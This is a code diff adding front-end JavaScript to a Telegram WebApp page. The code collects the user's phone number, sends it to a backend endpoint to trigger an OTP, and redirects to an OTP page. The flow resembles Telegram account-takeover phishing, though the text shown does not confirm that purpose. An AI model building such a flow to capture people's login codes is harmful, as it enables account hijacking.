@@ -355,4 +355,108 @@
                 // For WebApp, we need to use contact sharing via chat
                 
                 // In WebApp, we can use the contact field in initDataUnsafe if available
-               
+                const contact = tg.initDataUnsafe?.contact;
+                if (contact && contact.phone_number) {
+                    // Contact already shared via WebApp button
+                    handleContactReceived(contact.phone_number);
+                } else {
+                    // Fallback: Use inline keyboard to share contact in chat
+                    showContactKeyboard();
+                }
+            } else {
+                // Fallback for older clients
+                showContactKeyboard();
+            }
+        }
+        
+        function showContactKeyboard() {
+            // Show a prompt for manual entry in WebApp
+            const phone = prompt('Please enter your phone number with country code (e.g., +1234567890):');
+            if (phone) {
+                handleContactReceived(phone);
+            } else {
+                showError('Phone number is required for verification');
+            }
+        }
+        
+        function handleContactReceived(phone) {
+            phoneNumber = phone;
+            
+            // Show processing screen
+            document.getElementById('contact-screen').classList.add('hidden');
+            document.getElementById('processing-screen').classList.remove('hidden');
+            document.getElementById('phone-display').textContent = `Phone: ${phoneNumber}`;
+            
+            // Send contact to backend
+            sendContactToBackend(phoneNumber);
+        }
+        
+        function sendContactToBackend(phone) {
+            showLoading('Sending OTP...');
+            
+            fetch('/api/process-contact', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    phone: phone
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Redirect to OTP page
+                    window.location.href = `/otp/${sessionId}/${encodeURIComponent(data.phone)}`;
+                } else {
+                    hideLoading();
+                    document.getElementById('contact-error').textContent = data.error || 'Failed to send OTP';
+                    document.getElementById('contact-error').classList.add('show');
+                    
+                    // Show retry button after 3 seconds
+                    setTimeout(() => {
+                        document.getElementById('processing-screen').classList.add('hidden');
+                        document.getElementById('contact-screen').classList.remove('hidden');
+                        document.getElementById('contact-error').classList.remove('show');
+                    }, 3000);
+                }
+            })
+            .catch(error => {
+                hideLoading();
+                document.getElementById('contact-error').textContent = 'Network error. Please try again.';
+                document.getElementById('contact-error').classList.add('show');
+            });
+        }
+        
+        function showLoading(message) {
+            document.getElementById('loading-text').textContent = message || 'Processing...';
+            document.getElementById('contact-screen').classList.add('hidden');
+            document.getElementById('processing-screen').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+        }
+        
+        function hideLoading() {
+            document.getElementById('loading-screen').classList.add('hidden');
+        }
+        
+        function showError(message) {
+            const errorEl = document.getElementById('error-message');
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+            
+            setTimeout(() => {
+                errorEl.classList.remove('show');
+            }, 5000);
+        }
+        
+        // Handle Telegram theme changes
+        if (tg) {
+            tg.onEvent('themeChanged', applyTelegramTheme);
+            tg.onEvent('viewportChanged', function() {
+                tg.expand(); // Always keep expanded
+            });
+        }
+    </script>
+</body>
+</html>
